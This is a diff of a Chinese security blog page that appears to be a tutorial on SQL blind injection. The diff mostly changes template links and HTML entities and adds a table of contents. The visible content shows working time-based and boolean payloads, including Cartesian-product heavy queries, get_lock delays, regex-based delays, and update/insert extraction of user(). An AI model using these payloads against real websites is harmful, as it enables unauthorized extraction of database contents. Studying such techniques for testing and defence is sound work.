@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>一篇文章带你深入理解 SQL 盲注 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/6.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="/css/main.css?v=1.0.4"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body style="background:#fbfbfb;"><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">一篇文章带你深入理解 SQL 盲注</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/rss/"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">一篇文章带你深入理解 SQL 盲注</h1><div class="post-meta">Feb 21, 2019<span> | </span><span class="category"><a href="/categories/漏洞研究/">漏洞研究</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="post-content"><p>原文首发于安全客：<a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p>
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>一篇文章带你深入理解 SQL 盲注 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">一篇文章带你深入理解 SQL 盲注</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">一篇文章带你深入理解 SQL 盲注</h1><div class="post-meta">Feb 21, 2019<span> | </span><span class="category"><a href="/categories/漏洞研究/">漏洞研究</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-盲注的一般模式"><span class="toc-number">2.</span> <span class="toc-text">0X01 盲注的一般模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-and-0-的短路特性"><span class="toc-number">2.1.</span> <span class="toc-text">1.and 0 的短路特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-or-1-的短路特性"><span class="toc-number">2.2.</span> <span class="toc-text">2.or 1 的短路特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-elt-的分流特性"><span class="toc-number">2.3.</span> <span class="toc-text">3.elt() 的分流特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-field-的分流特性"><span class="toc-number">2.4.</span> <span class="toc-text">4.field() 的分流特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-基于时间的盲注"><span class="toc-number">3.</span> <span class="toc-text">0X02 基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MYSQL-的-sleep-和-benchmark"><span class="toc-number">3.1.</span> <span class="toc-text">1. MYSQL 的 sleep 和 benchmark</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#补充-SQL-Server的方法："><span class="toc-number">3.1.1.</span> <span class="toc-text">补充 SQL Server的方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Heavy-Query-笛卡尔积"><span class="toc-number">3.2.</span> <span class="toc-text">2.Heavy Query 笛卡尔积</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Get-lock-加锁机制"><span class="toc-number">3.3.</span> <span class="toc-text">3.Get_lock() 加锁机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析到这里似乎已经结束了，但是其实这个-get-lock-的使用并不是没有限制条件"><span class="toc-number">3.3.1.</span> <span class="toc-text">分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Heavy-Query-正则表达式"><span class="toc-number">3.4.</span> <span class="toc-text">4.Heavy Query 正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-该种技术的优缺点"><span class="toc-number">3.5.</span> <span class="toc-text">5.该种技术的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-一点点补充"><span class="toc-number">3.6.</span> <span class="toc-text">6.一点点补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-基于布尔的盲注"><span class="toc-number">4.</span> <span class="toc-text">0X03 基于布尔的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-使用条件"><span class="toc-number">4.1.</span> <span class="toc-text">1.使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-简单举例"><span class="toc-number">4.2.</span> <span class="toc-text">2.简单举例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-高级案例"><span class="toc-number">4.3.</span> <span class="toc-text">3.高级案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#举几个例子："><span class="toc-number">4.3.1.</span> <span class="toc-text">举几个例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-使用-amp"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">1.使用 &amp;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-使用"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">2.使用 |</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-使用"><span class="toc-number">4.3.1.3.</span> <span class="toc-text">3.使用 ^</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-使用"><span class="toc-number">4.3.1.4.</span> <span class="toc-text">4.使用 ~</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#示例1："><span class="toc-number">4.3.1.4.1.</span> <span class="toc-text">示例1：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#示例2："><span class="toc-number">4.3.1.4.2.</span> <span class="toc-text">示例2：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-使用-lt-lt-或-gt-gt"><span class="toc-number">4.3.1.5.</span> <span class="toc-text">5.使用 &lt;&lt; 或 &gt;&gt;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-一点点补充-1"><span class="toc-number">4.3.1.6.</span> <span class="toc-text">6.一点点补充</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-数据提取方法"><span class="toc-number">5.</span> <span class="toc-text">0X04 数据提取方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-举几个简单的例子："><span class="toc-number">5.1.</span> <span class="toc-text">1.举几个简单的例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#示例1"><span class="toc-number">5.1.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例2"><span class="toc-number">5.1.2.</span> <span class="toc-text">示例2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例3"><span class="toc-number">5.1.3.</span> <span class="toc-text">示例3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-二分法提取数据"><span class="toc-number">5.2.</span> <span class="toc-text">2.二分法提取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-高级技巧"><span class="toc-number">6.</span> <span class="toc-text">0X05 高级技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-简单介绍："><span class="toc-number">6.1.</span> <span class="toc-text">1.简单介绍：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-针对-MsSQL"><span class="toc-number">6.2.</span> <span class="toc-text">2.针对 MsSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-master-xp-dirtree"><span class="toc-number">6.2.1.</span> <span class="toc-text">1.master..xp_dirtree</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-master-xp-fileexist"><span class="toc-number">6.2.2.</span> <span class="toc-text">2.master..xp_fileexist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-master-xp-subdirs"><span class="toc-number">6.2.3.</span> <span class="toc-text">3.master..xp_subdirs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-实战案例"><span class="toc-number">6.2.4.</span> <span class="toc-text">4.实战案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-针对-Oracle"><span class="toc-number">6.3.</span> <span class="toc-text">3.针对 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-UTL-INADDR-GET-HOST-ADDRESS"><span class="toc-number">6.3.1.</span> <span class="toc-text">1.UTL_INADDR.GET_HOST_ADDRESS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UTL-HTTP-REQUEST"><span class="toc-number">6.3.2.</span> <span class="toc-text">2.UTL_HTTP.REQUEST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-HTTPURITYPE-GETCLOB"><span class="toc-number">6.3.3.</span> <span class="toc-text">3.HTTPURITYPE.GETCLOB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-DBMS-LDAP-INIT"><span class="toc-number">6.3.4.</span> <span class="toc-text">4.DBMS_LDAP.INIT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-实战案例"><span class="toc-number">6.3.5.</span> <span class="toc-text">5.实战案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-针对-MySQL"><span class="toc-number">6.4.</span> <span class="toc-text">4.针对 MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-利用条件"><span class="toc-number">6.4.1.</span> <span class="toc-text">1.利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-LOAD-FILE"><span class="toc-number">6.4.2.</span> <span class="toc-text">1.LOAD_FILE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-实战案例"><span class="toc-number">6.4.3.</span> <span class="toc-text">2.实战案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-sqlmap-的扩展"><span class="toc-number">6.5.</span> <span class="toc-text">5.sqlmap 的扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-总结"><span class="toc-number">7.</span> <span class="toc-text">0X06 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X07-参考链接"><span class="toc-number">8.</span> <span class="toc-text">0X07 参考链接</span></a></li></ol></div></div><div class="post-content"><p>原文首发于安全客：<a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p>
 <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>简单的整理一下关于 SQL 盲注的一些想法(主要是针对 MYSQL,当然其中也不免夹杂着一些 SQL Server 和Oracle的知识)，希望能有更清晰的思路和不一样的思考。</p>
 <h2 id="0X01-盲注的一般模式"><a href="#0X01-盲注的一般模式" class="headerlink" title="0X01 盲注的一般模式"></a><strong>0X01 盲注的一般模式</strong></h2><p>盲注的本质是猜解(所谓 “盲” 就是在你看不到返回数据的情况下能通过 “感觉” 来判断)，那能感觉到什么？答案是<strong>：差异</strong>（包括<strong>运行时间的差异</strong>和<strong>页面返回结果的差异</strong>）。也就是说我们想实现的是我们要构造一条语句来测试我们输入的<strong>布尔表达式</strong>，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p>
 <p><strong>如图所示：</strong></p>
@@ -30,8 +30,8 @@ mysql&gt; select * from bsqli where id = 1 or 0 or sleep(1);
 1 row in set (1.00 sec)
 </code></pre><p>和上面类似 or 取得是两个集合的并集，系统检测到 or 1 的时候就不会继续检测，所以 sleep() 也就不会运行。</p>
 <p>那么这里我们可以将 sleep() 换成我们下面准备讲的 Heavy Query ，如下</p>
-<pre><code>id = 1&apos; and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
-id = 1&apos; and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
+<pre><code>id = 1&#39; and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
+id = 1&#39; and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
 </code></pre><p>除了上面两个我们还能用 <strong>case when then else end</strong> 这个句型，这个和 <strong>if</strong> 是类似的我这里就不多介绍，我这里还想说一个我另外发现的比较有趣的一个函数(<strong>准确的说是两个函数</strong>)</p>
 <h3 id="3-elt-的分流特性"><a href="#3-elt-的分流特性" class="headerlink" title="3.elt() 的分流特性"></a><strong>3.elt() 的分流特性</strong></h3><pre><code>ELT(N ,str1 ,str2 ,str3 ,…)
 </code></pre><p>函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 ELT() 是 FIELD() 的补数</p>
@@ -82,7 +82,7 @@ Empty set (1.00 sec)
 <h3 id="2-Heavy-Query-笛卡尔积"><a href="#2-Heavy-Query-笛卡尔积" class="headerlink" title="2.Heavy Query 笛卡尔积"></a><strong>2.Heavy Query 笛卡尔积</strong></h3><p>这种方式我把它称之为 Heavy Query 中的 <strong>“笛卡尔积”</strong>，具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统，我们可以简单的将这种模式用下面的示意图表示。</p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A81.png" alt="此处输入图片的描述"></p>
 <p>由于每个数据库的数据量差异较大，并且有着自己独特的表与字段，所以为了使用这种方式发起攻击，我们不能依赖于不同数据库的特性而是要依赖于数据库的共性，也就是利用系统自带的表和字段来完成攻击，下面是一个能够在 SQL SERVER 和 MYSQL 中成功执行的模板：</p>
-<pre><code>SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
+<pre><code> SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
 </code></pre><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数，执行效果如下：</p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A82.png" alt="此处输入图片的描述"></p>
 <p>我们来单独执行一次对这个 columns 表的查询，然后对这个结果进行 3 次方运算，如下：</p>
@@ -130,10 +130,10 @@ SELECT RELEASE_LOCK(key) FROM DUAL;
 <p>可以看到没有任何的延时，并且返回 1 表示加锁成功</p>
 <p>好了，有了上面的基础，我们是否能根据我上面对时间盲注原理的简单分析来举一反三实现利用 get_lock() 这种延时方式构造时间盲注语句呢？</p>
 <p><strong>(1)我们首先通过注入实现对 username 字段的加锁</strong></p>
-<pre><code>select * from ctf where flag = 1 and get_lock(&apos;username&apos;,1);
+<pre><code>select * from ctf where flag = 1 and get_lock(&#39;username&#39;,1);
 </code></pre><p><strong>(2)然后构造我们的盲注语句</strong></p>
-<pre><code>select * from ctf where flag = 1 and 1 and get_lock(&apos;username&apos;,5);
-select * from ctf where flag = 1 and 0 and get_lock(&apos;username&apos;,5);
+<pre><code>select * from ctf where flag = 1 and 1 and get_lock(&#39;username&#39;,5);
+select * from ctf where flag = 1 and 0 and get_lock(&#39;username&#39;,5);
 </code></pre><h4 id="分析到这里似乎已经结束了，但是其实这个-get-lock-的使用并不是没有限制条件"><a href="#分析到这里似乎已经结束了，但是其实这个-get-lock-的使用并不是没有限制条件" class="headerlink" title="分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件"></a><strong>分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件</strong></h4><p>限制条件就是数据库的连接必须是<strong>持久连接</strong>，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。</p>
 <p><strong>php 手册中对持久连接这样描述</strong></p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A89.png" alt="此处输入图片的描述"></p>
@@ -150,7 +150,7 @@ select * from ctf where flag = 1 and 0 and get_lock(&apos;username&apos;,5);
 
 _ : 匹配任意一个字符
 
-escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE &apos;/%/_%_&apos; ESCAPE&apos;/&apos;
+escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE &#39;/%/_%_&#39; ESCAPE&#39;/&#39;
 </code></pre><p>(2)rlike和regexp:常用通配符：. 、* 、 [] 、 ^ 、 $ 、{n}</p>
 <pre><code>. : 匹配任意单个字符
 
@@ -164,25 +164,25 @@ $ : 匹配结尾，如s$匹配以s结尾的字符串。
 
 {n} : 匹配前一个字符反复n次。
 </code></pre><p><strong>我们可以这样构造：</strong></p>
-<pre><code>mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;
+<pre><code>mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;
 Empty set (4.24 sec)
 
-mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;
+mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;
 Empty set (0.00 sec)
 </code></pre><p>上面这两个语句的构造来源于 一叶飘零 师傅的博客，但是我觉得这里面有一点点问题，我发现，我在本地测试的效果并没有 一叶飘零师傅测试的那么好，延迟效果不是很明显，只有 0.29s 并且还以为 MySQL 的某种缓存机制导致我下一次执行该命令的时候直接就是 0.00s 了，当然 rlike 如果成功的话 regexp 只要简单的替换一下就 ok 了,like 的话也依次类推 。</p>
 <p>我后来又使用了 mysql8 进行尝试(原来我的版本是 mysql 5.5.53) ，发现了下面的情况</p>
-<pre><code>mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;
+<pre><code>mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;
 ERROR 3699 (HY000): Timeout exceeded in regular expression match.
 
-mysql&gt; select * from test where id =1 and IF(0,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;
+mysql&gt; select * from test where id =1 and IF(0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;
 Empty set (0.00 sec)
 </code></pre><p>在 mysql8 下也同样没有延迟，并且直接提示超时，所以我认为这个方法并不通用，与 MySQL 的版本有着比较紧密的联系。</p>
 <h3 id="5-该种技术的优缺点"><a href="#5-该种技术的优缺点" class="headerlink" title="5.该种技术的优缺点"></a><strong>5.该种技术的优缺点</strong></h3><p>这种技术的一个主要优点是对日志几乎没有影响，特别是与基于错误的攻击相比。但是，在必须使用大量查询或 CPU密集型函数（如MySQL的BENCHMARK())的情况下，系统管理员可能会意识到正在发生的事情。</p>
 <p>另一件需要考虑的事情是你注入的延迟时间。在测试Web应用程序时，这一点尤其重要。因为该服务器负载和网络速度可能对响应时间产生巨大的影响。你需要暂停查询足够长的时间，以确保这些不确定因素不会干扰你的测试结果。另一方面，你又会希望延迟足够短以在合理的时间内测试应用程序，所以把握这个时间长短的度是很困难的。</p>
 <h3 id="6-一点点补充"><a href="#6-一点点补充" class="headerlink" title="6.一点点补充"></a><strong>6.一点点补充</strong></h3><p>由于平时用的不多，想在这里稍微记录一下关于 insert 和 update 的盲注示例</p>
-<pre><code>update users set username = &apos;0&apos;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;
+<pre><code>update users set username = &#39;0&#39;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;
 
-insert into users values (16,&apos;K0rz3n&apos;,&apos;0&apos;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
+insert into users values (16,&#39;K0rz3n&#39;,&#39;0&#39;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
